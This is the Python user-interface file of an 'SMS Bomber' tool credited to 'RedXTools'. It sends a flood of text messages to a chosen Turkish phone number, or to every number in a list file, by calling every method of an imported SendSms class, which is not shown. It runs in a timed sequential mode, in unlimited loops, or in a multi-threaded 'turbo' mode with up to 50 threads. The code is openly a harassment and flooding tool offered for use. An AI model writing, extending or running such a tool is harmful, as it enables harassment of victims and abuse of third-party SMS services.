import os
import time
import threading
from colorama import Fore, Style, init
from .sms import SendSms

import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
import modules.rpc_manager as rpc_manager
rpc_manager.set_details("SMS Bomber")

init(autoreset=True)

class SMSBomberUI:
    def __init__(self):
        self.version = "1.0.0"
        self.author = "RedXTools"
        self.project_name = "SMS Bomber"
        
        self.services = []
        for attribute in dir(SendSms):
            attribute_value = getattr(SendSms, attribute)
            if callable(attribute_value):
                if not attribute.startswith('__'):
                    self.services.append(attribute)
        
        self.max_threads = 50
        self.default_delay = 1
        
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        
    def print_banner(self):
        self.clear_screen()
        banner = f"""{Fore.RED}
┌─────────────────────────────────────────────────────────────────────────────────────┐
│                                                                                     │
│  ███████╗███╗   ███╗███████╗   ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗  │
│  ██╔════╝████╗ ████║██╔════╝   ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗ │
│  ███████╗██╔████╔██║███████╗   ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝ │
│  ╚════██║██║╚██╔╝██║╚════██║   ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗ │
│  ███████║██║ ╚═╝ ██║███████║   ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║ │
│  ╚══════╝╚═╝     ╚═╝╚══════╝   ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝ │
│                                                                                     │
│   Version: {Fore.LIGHTRED_EX}{self.version}{Fore.RED}  │  Developer: {Fore.LIGHTRED_EX}{self.author}{Fore.RED}  │ Services: {Fore.LIGHTRED_EX}{len(self.services)}{Fore.RED}                           │
│                                                                                     │
└─────────────────────────────────────────────────────────────────────────────────────┘
        {Style.RESET_ALL}"""

        print(banner)
        
    def print_menu(self):
        print(f"""{Fore.RED}
┌─────────────────────────────────────────────────────────────────────────────────────┐
│                                   SMS BOMBER                                        │
├─────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                     │
│  {Fore.WHITE}[{Fore.GREEN}1{Fore.WHITE}]{Fore.GREEN} Send SMS (Normal)                 {Fore.WHITE}Single target, sequential execution          {Fore.RED}│
│  {Fore.WHITE}[{Fore.YELLOW}2{Fore.WHITE}]{Fore.YELLOW} Send SMS (Turbo)                  {Fore.WHITE}Multi-threaded rapid execution               {Fore.RED}│
│  {Fore.WHITE}[{Fore.LIGHTRED_EX}0{Fore.WHITE}]{Fore.LIGHTRED_EX} Exit                              {Fore.WHITE}Exit program                                 {Fore.RED}│
│                                                                                     │
└─────────────────────────────────────────────────────────────────────────────────────┘
{Style.RESET_ALL}""")
        
    def get_phone_input(self):
        while True:
            try:
                print(f"{Fore.LIGHTYELLOW_EX}Enter phone number (without +90 prefix): {Fore.LIGHTGREEN_EX}", end="")
                phone = input().strip()
                
                if not phone:
                    print(f"{Fore.LIGHTRED_EX}[x] Phone number cannot be empty!{Style.RESET_ALL}")
                    continue
                    
                if not phone.isdigit() or len(phone) != 10:
                    print(f"{Fore.LIGHTRED_EX}[x] Invalid phone number! Must be 10 digits.{Style.RESET_ALL}")
                    continue
                    
                return phone
                
            except KeyboardInterrupt:
                return None
            except Exception as e:
                print(f"{Fore.LIGHTRED_EX}[x] Error: {str(e)}{Style.RESET_ALL}")
                continue
                
    def get_phone_list(self):
        while True:
            try:
                print(f"{Fore.LIGHTYELLOW_EX}Enter path to phone list file: {Fore.LIGHTGREEN_EX}", end="")
                file_path = input().strip()
                
                if not file_path:
                    return []
                    
                if not os.path.exists(file_path):
                    print(f"{Fore.LIGHTRED_EX}[x] File not found: {file_path}{Style.RESET_ALL}")
                    continue
                    
                phone_list = []
                with open(file_path, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if line.isdigit() and len(line) == 10:
                            phone_list.append(line)
                            
                if not phone_list:
                    print(f"{Fore.LIGHTRED_EX}[x] No valid phone numbers found in file!{Style.RESET_ALL}")
                    continue
                    
                print(f"{Fore.GREEN}[+] Loaded {len(phone_list)} phone numbers{Style.RESET_ALL}")
                return phone_list
                
            except KeyboardInterrupt:
                return []
            except Exception as e:
                print(f"{Fore.LIGHTRED_EX}[x] Error reading file: {str(e)}{Style.RESET_ALL}")
                continue
                
    def get_email_input(self):
        while True:
            try:
                print(f"{Fore.LIGHTYELLOW_EX}Enter email address (press Enter for random): {Fore.LIGHTGREEN_EX}", end="")
                email = input().strip()
                
                if email == "":
                    return ""
                    
                if "@" not in email or "." not in email:
                    print(f"{Fore.LIGHTRED_EX}[x] Invalid email format!{Style.RESET_ALL}")
                    continue
                    
                return email
                
            except KeyboardInterrupt:
                return None
            except Exception as e:
                print(f"{Fore.LIGHTRED_EX}[x] Error: {str(e)}{Style.RESET_ALL}")
                continue
                
    def get_count_input(self):
        while True:
            try:
                print(f"{Fore.LIGHTYELLOW_EX}Enter number of SMS to send (unlimited): {Fore.LIGHTGREEN_EX}", end="")
                count_input = input().strip()
                
                if count_input == "":
                    return None
                    
                count = int(count_input)
                if count <= 0:
                    print(f"{Fore.LIGHTRED_EX}[x] Count must be greater than 0!{Style.RESET_ALL}")
                    continue
                    
                return count
                
            except ValueError:
                print(f"{Fore.LIGHTRED_EX}[x] Invalid number!{Style.RESET_ALL}")
                continue
            except KeyboardInterrupt:
                return None
            except Exception as e:
                print(f"{Fore.LIGHTRED_EX}[x] Error: {str(e)}{Style.RESET_ALL}")
                continue
                
    def get_delay_input(self):
        while True:
            try:
                print(f"{Fore.LIGHTYELLOW_EX}Enter delay between SMS (seconds): {Fore.LIGHTGREEN_EX}", end="")
                delay_input = input().strip()
                
                delay = float(delay_input)
                if delay < 0:
                    print(f"{Fore.LIGHTRED_EX}[x] Delay cannot be negative!{Style.RESET_ALL}")
                    continue
                    
                return delay
                
            except ValueError:
                print(f"{Fore.LIGHTRED_EX}[x] Invalid number!{Style.RESET_ALL}")
                continue
            except KeyboardInterrupt:
                return None
            except Exception as e:
                print(f"{Fore.LIGHTRED_EX}[x] Error: {str(e)}{Style.RESET_ALL}")
                continue
                
    def send_normal_sms(self, phone, email, count, delay):
        sms = SendSms(phone, email)
        
        if count is None:
            print(f"{Fore.GREEN}[+] Starting unlimited SMS bombing...{Style.RESET_ALL}")
            while True:
                for service in self.services:
                    try:
                        getattr(sms, service)()
                        time.sleep(delay)
                    except Exception as e:
                        print(f"{Fore.LIGHTRED_EX}[x] Error in {service}: {str(e)}{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[+] Starting SMS bombing ({count} messages)...{Style.RESET_ALL}")
            for i in range(count):
                for service in self.services:
                    try:
                        getattr(sms, service)()
                        time.sleep(delay)
                    except Exception as e:
                        print(f"{Fore.LIGHTRED_EX}[x] Error in {service}: {str(e)}{Style.RESET_ALL}")
                        
                if i < count - 1:
                    print(f"{Fore.CYAN}[{i+1}/{count}] Round completed{Style.RESET_ALL}")
                    
        print(f"{Fore.GREEN}[+] SMS bombing completed! Total sent: {sms.count}{Style.RESET_ALL}")
        
    def send_turbo_sms(self, phone, email):
        sms = SendSms(phone, email)
        stop_event = threading.Event()
        
        def turbo_worker():
            while not stop_event.is_set():
                threads = []
                for service in self.services:
                    if len(threads) >= self.max_threads:
                        break
                    t = threading.Thread(target=getattr(sms, service), daemon=True)
                    threads.append(t)
                    t.start()
                
                for t in threads:
                    t.join()
                    
                time.sleep(0.1)
                
        try:
            print(f"{Fore.GREEN}[+] Starting turbo SMS bombing...{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Press Ctrl+C to stop{Style.RESET_ALL}")
            turbo_worker()
        except KeyboardInterrupt:
            stop_event.set()
            print(f"\n{Fore.LIGHTRED_EX}[!] Turbo bombing stopped by user{Style.RESET_ALL}")
            
        print(f"{Fore.GREEN}[+] Turbo bombing completed! Total sent: {sms.count}{Style.RESET_ALL}")
        
    def run(self):
        while True:
            self.print_banner()
            self.print_menu()
            
            try:
                choice = input(f"{Fore.CYAN}┌─[{Fore.WHITE}SELECT{Fore.CYAN}]\n└──> {Fore.WHITE}").strip()
            except KeyboardInterrupt:
                break
                
            if choice == '1':
                self.clear_screen()
                print(f"{Fore.LIGHTYELLOW_EX}Single Target Mode{Style.RESET_ALL}")
                print(f"{Fore.CYAN}{'─'*50}{Style.RESET_ALL}")
                
                phone = self.get_phone_input()
                if phone is None:
                    continue
                    
                email = self.get_email_input()
                if email is None:
                    continue
                    
                count = self.get_count_input()
                if count is None:
                    continue
                    
                delay = self.get_delay_input()
                if delay is None:
                    continue
                    
                self.clear_screen()
                self.send_normal_sms(phone, email, count, delay)
                
            elif choice == '2':
                self.clear_screen()
                print(f"{Fore.LIGHTYELLOW_EX}Turbo Mode{Style.RESET_ALL}")
                print(f"{Fore.CYAN}{'─'*50}{Style.RESET_ALL}")
                
                phone = self.get_phone_input()
                if phone is None:
                    continue
                    
                email = self.get_email_input()
                if email is None:
                    continue
                    
                self.clear_screen()
                self.send_turbo_sms(phone, email)
                
            elif choice == '0':
                self.clear_screen()
                print(f"""{Fore.RED}
┌─────────────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│                   Thank you for using SMS Bomber!                             │
│                      Developed by {self.author}                                  │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────────────────────┘
{Style.RESET_ALL}""")
                break
                
            else:
                print(f"\n{Fore.LIGHTRED_EX}[x] Invalid choice!{Style.RESET_ALL}")
                time.sleep(1)

if __name__ == "__main__":
    app = SMSBomberUI()
    app.run()
